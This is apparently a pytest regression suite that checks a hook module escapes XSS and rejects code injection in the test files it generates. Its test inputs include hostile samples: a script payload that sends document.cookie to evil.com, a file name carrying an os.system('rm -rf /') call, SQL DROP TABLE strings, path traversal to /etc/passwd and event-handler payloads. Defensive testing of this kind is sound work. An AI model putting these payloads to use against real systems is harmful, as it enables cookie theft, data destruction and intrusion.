"""
Regression test: MEDIUM severity XSS vulnerability should never return.

Vulnerability: auto_add_to_regression.py XSS vulnerability (MEDIUM severity)
Fixed on: 2025-11-05
Security Audit: docs/sessions/SECURITY_AUDIT_REGRESSION_TEST_SUITE_20251105.md

Attack Vector:
- User input (user_prompt, file_path) directly embedded in generated Python files
- No input validation or sanitization
- f-string interpolation allows XSS injection
- Generated test files could contain executable malicious code

Fix Applied:
1. Added validate_python_identifier() - validates module names
2. Added sanitize_user_description() - HTML entity encoding
3. Converted all generation functions to use string.Template
4. Input validation prevents code injection
5. HTML entity encoding prevents XSS

Purpose:
Ensures this XSS vulnerability never returns.
If this test fails, the vulnerability has been reintroduced.

IMPORTANT: This test suite is PERMANENT and should NEVER be removed.
"""

import sys
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

# Add hooks directory to path for imports
sys.path.insert(
    0,
    str(
        Path(__file__).parent.parent.parent
        / "plugins"
        / "autonomous-dev"
        / "hooks"
    ),
)

try:
    from auto_add_to_regression import (
        validate_python_identifier,
        sanitize_user_description,
        generate_feature_regression_test,
        generate_bugfix_regression_test,
        generate_performance_baseline_test,
    )
except ImportError:
    pytest.skip(
        "auto_add_to_regression.py archived â€” tests no longer applicable",
        allow_module_level=True,
    )


# ============================================================================
# Permanent XSS Vulnerability Regression Tests
# ============================================================================


@pytest.mark.regression
class TestXSSVulnerabilityNeverReturns:
    """Permanent tests ensuring XSS vulnerability never returns."""

    def test_script_tag_injection_prevented(self, tmp_path):
        """
        CRITICAL: Prevent XSS via <script> tag injection.

        Attack: User provides description with <script> tags
        Expected: Tags are escaped, not executable
        """
        file_path = tmp_path / "test_module.py"
        file_path.touch()

        xss_attack = "<script>alert('XSS')</script> Feature description"

        # Test all three generation functions
        _, feature_content = generate_feature_regression_test(file_path, xss_attack)
        _, bugfix_content = generate_bugfix_regression_test(file_path, xss_attack)
        _, perf_content = generate_performance_baseline_test(file_path, xss_attack)

        # Verify NO executable script tags in ANY generated content
        for content in [feature_content, bugfix_content, perf_content]:
            assert "<script>" not in content, "XSS vulnerability: <script> tag not escaped!"
            assert "</script>" not in content, "XSS vulnerability: </script> tag not escaped!"
            assert "&lt;script&gt;" in content, "XSS escape missing: should use &lt;script&gt;"

    def test_img_onerror_injection_prevented(self, tmp_path):
        """
        CRITICAL: Prevent XSS via img onerror injection.

        Attack: User provides img tag with onerror handler
        Expected: Tags are escaped, handler not executable
        """
        file_path = tmp_path / "test_module.py"
        file_path.touch()

        xss_attack = '<img src=x onerror="alert(document.cookie)">'

        _, feature_content = generate_feature_regression_test(file_path, xss_attack)

        # Verify img tag is escaped
        assert '<img src=x onerror="alert(document.cookie)">' not in feature_content
        assert "&lt;img" in feature_content or "onerror=" not in feature_content

    def test_event_handler_injection_prevented(self, tmp_path):
        """
        CRITICAL: Prevent XSS via event handler injection.

        Attack: User provides HTML with onclick/onload handlers
        Expected: Handlers are escaped
        """
        file_path = tmp_path / "test_module.py"
        file_path.touch()

        xss_attack = '<a href="#" onclick="malicious()">Click</a>'

        _, bugfix_content = generate_bugfix_regression_test(file_path, xss_attack)

        # Verify event handler is escaped
        assert 'onclick="malicious()"' not in bugfix_content
        assert "&lt;a" in bugfix_content or "&quot;" in bugfix_content

    def test_code_injection_via_module_name_prevented(self, tmp_path):
        """
        CRITICAL: Prevent code injection via malicious module names.

        Attack: File path contains malicious Python code
        Expected: ValueError raised, module name validation fails
        """
        # Attempt code injection via file name
        malicious_paths = [
            tmp_path / "__import__('os').system('rm -rf /')__.py",
            tmp_path / "'; DROP TABLE users; --.py",
            tmp_path / "<script>alert(1)</script>.py",
        ]

        for malicious_path in malicious_paths:
            with pytest.raises(
                ValueError, match="Invalid identifier|Python keyword"
            ):
                generate_feature_regression_test(malicious_path, "Safe description")

    def test_all_generation_functions_escape_xss(self, tmp_path):
        """
        CRITICAL: All three generation functions must escape XSS.

        Attack: Same XSS payload to all functions
        Expected: All functions escape the payload
        """
        file_path = tmp_path / "test_module.py"
        file_path.touch()

        xss_payloads = [
            "<script>fetch('http://evil.com?cookie='+document.cookie)</script>",
            '<iframe src="javascript:alert(1)"></iframe>',
            '<svg onload="alert(1)">',
        ]

        for payload in xss_payloads:
            # Test feature generation
            _, feature_content = generate_feature_regression_test(file_path, payload)
            assert "<script>" not in feature_content
            assert "<iframe" not in feature_content or "&lt;iframe" in feature_content
            assert "<svg" not in feature_content or "&lt;svg" in feature_content

            # Test bugfix generation
            _, bugfix_content = generate_bugfix_regression_test(file_path, payload)
            assert "<script>" not in bugfix_content
            assert "<iframe" not in bugfix_content or "&lt;iframe" in bugfix_content
            assert "<svg" not in bugfix_content or "&lt;svg" in bugfix_content

            # Test performance generation
            _, perf_content = generate_performance_baseline_test(file_path, payload)
            assert "<script>" not in perf_content
            assert "<iframe" not in perf_content or "&lt;iframe" in perf_content
            assert "<svg" not in perf_content or "&lt;svg" in perf_content


@pytest.mark.regression
class TestCodeInjectionVulnerabilityNeverReturns:
    """Permanent tests ensuring code injection vulnerability never returns."""

    def test_python_keyword_injection_prevented(self):
        """
        CRITICAL: Prevent code injection via Python keywords.

        Attack: Use Python keywords as identifiers
        Expected: ValueError raised
        """
        python_keywords = ["import", "exec", "eval", "class", "def", "__import__"]

        for keyword in python_keywords:
            with pytest.raises(ValueError, match="Python keyword|Invalid identifier"):
                validate_python_identifier(keyword)

    def test_dunder_method_injection_prevented(self):
        """
        CRITICAL: Prevent code injection via dunder methods.

        Attack: Use __import__, __builtins__ etc.
        Expected: ValueError raised
        """
        dunder_methods = ["__import__", "__builtins__", "__globals__", "__locals__"]

        for method in dunder_methods:
            with pytest.raises(ValueError, match="Invalid identifier"):
                validate_python_identifier(method)

    def test_path_traversal_injection_prevented(self):
        """
        CRITICAL: Prevent path traversal via module names.

        Attack: Use ../ or ..\\ in module names
        Expected: ValueError raised
        """
        traversal_attempts = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "module/../../attack",
        ]

        for attempt in traversal_attempts:
            with pytest.raises(ValueError, match="Invalid identifier"):
                validate_python_identifier(attempt)

    def test_null_byte_injection_prevented(self):
        """
        CRITICAL: Prevent null byte injection.

        Attack: Inject null bytes to bypass validation
        Expected: ValueError raised or null bytes removed
        """
        null_byte_attacks = ["module\x00attack", "test\x00.py", "\x00malicious"]

        for attack in null_byte_attacks:
            # Should either raise ValueError or remove null bytes
            try:
                result = validate_python_identifier(attack)
                assert "\x00" not in result, "Null byte not removed!"
            except ValueError:
                pass  # Also acceptable

    def test_sql_injection_pattern_escaped(self, tmp_path):
        """
        CRITICAL: Prevent SQL injection patterns in descriptions.

        Attack: SQL injection payload in user description
        Expected: Quotes are escaped
        """
        file_path = tmp_path / "test_module.py"
        file_path.touch()

        sql_injection = "Feature: '; DROP TABLE users; --"

        _, content = generate_feature_regression_test(file_path, sql_injection)

        # Single quotes should be escaped
        assert "DROP TABLE users" in content  # Content preserved
        assert "&#x27;" in content or "\\'" in content  # Quotes escaped


@pytest.mark.regression
class TestInputValidationNeverRegresses:
    """Permanent tests ensuring input validation never regresses."""

    def test_validate_python_identifier_enforced(self):
        """
        CRITICAL: Ensure validate_python_identifier() is enforced.

        This function MUST exist and be called on all module names.
        If removed, vulnerability returns.
        """
        # Function must exist
        assert callable(validate_python_identifier)

        # Function must reject invalid identifiers
        with pytest.raises(ValueError):
            validate_python_identifier("")

        with pytest.raises(ValueError):
            validate_python_identifier("123invalid")

        with pytest.raises(ValueError):
            validate_python_identifier("import")

    def test_sanitize_user_description_enforced(self):
        """
        CRITICAL: Ensure sanitize_user_description() is enforced.

        This function MUST exist and be called on all user input.
        If removed, vulnerability returns.
        """
        # Function must exist
        assert callable(sanitize_user_description)

        # Function must escape HTML entities
        result = sanitize_user_description("<script>alert(1)</script>")
        assert "<script>" not in result
        assert "&lt;script&gt;" in result

    def test_generation_functions_use_validation(self, tmp_path):
        """
        CRITICAL: Generation functions MUST call validation functions.

        If generation functions stop calling validation, vulnerability returns.
        """
        file_path = tmp_path / "test_module.py"
        file_path.touch()

        # Valid input should work
        description = "Safe feature description"
        _, content = generate_feature_regression_test(file_path, description)
        assert "Safe feature description" in content

        # Invalid module name should fail (proves validation is called)
        malicious_path = tmp_path / "'; DROP TABLE users; --.py"
        with pytest.raises(ValueError):
            generate_feature_regression_test(malicious_path, "Safe description")

    def test_no_fstring_interpolation_used(self, tmp_path):
        """
        CRITICAL: Ensure f-strings are NOT used for user input.

        f-strings were the vulnerability. Must use Template or % formatting.
        """
        file_path = tmp_path / "test_module.py"
        file_path.touch()

        # Description with f-string markers
        description = "Feature: {variable} and ${another}"

        _, content = generate_feature_regression_test(file_path, description)

        # If using Template, these should appear literally or be escaped
        # If using f-string, they'd be interpreted (BAD)
        assert "{variable}" in content or "variable" not in content
        assert "${another}" in content or "another" not in content

    def test_maximum_length_enforced(self):
        """
        CRITICAL: Ensure maximum length limits are enforced.

        Prevents DoS via extremely long input.
        """
        # Test identifier max length (100 chars)
        long_identifier = "a" * 101
        with pytest.raises(ValueError, match="too long"):
            validate_python_identifier(long_identifier)

        # Test description max length (500 chars)
        long_description = "A" * 600
        result = sanitize_user_description(long_description)
        assert len(result) <= 500
        assert result.endswith("...")


# ============================================================================
# Meta Test: Ensure This Regression Suite is Never Removed
# ============================================================================


@pytest.mark.regression
def test_xss_regression_suite_exists():
    """
    META TEST: Ensure this regression test file exists.

    If this test fails, someone deleted the regression suite.
    This is a security violation - XSS tests must remain PERMANENT.
    """
    regression_file = Path(__file__)
    assert regression_file.exists(), (
        "SECURITY VIOLATION: XSS regression test suite has been deleted! "
        "This file protects against MEDIUM severity XSS vulnerability. "
        "It must NEVER be removed. Restore immediately."
    )

    # Verify file contains the critical tests
    content = regression_file.read_text()
    assert "test_script_tag_injection_prevented" in content
    assert "test_code_injection_via_module_name_prevented" in content
    assert "validate_python_identifier" in content
    assert "sanitize_user_description" in content
